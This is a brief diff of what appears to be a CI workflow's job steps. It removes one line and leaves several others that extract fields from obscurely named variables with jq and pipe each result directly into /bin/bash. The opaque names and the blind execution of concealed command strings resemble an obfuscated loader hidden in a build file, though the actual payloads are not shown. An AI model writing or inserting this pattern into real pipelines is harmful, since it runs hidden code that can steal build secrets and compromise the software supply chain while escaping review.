@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$vh5404" | jq -r .l3 | /bin/bash
           printf '%s' "$t4" | jq -r .a81 | /bin/bash
           printf '%s' "$httaa3" | jq -r .ur20266 | /bin/bash
-          printf '%s' "$blob5" | jq -r .bww12 | /bin/bash
           printf '%s' "$j682" | jq -r .qckb55393 | /bin/bash
           echo $dfsj03 | jq -r .oxsd0542 | /bin/bash
 
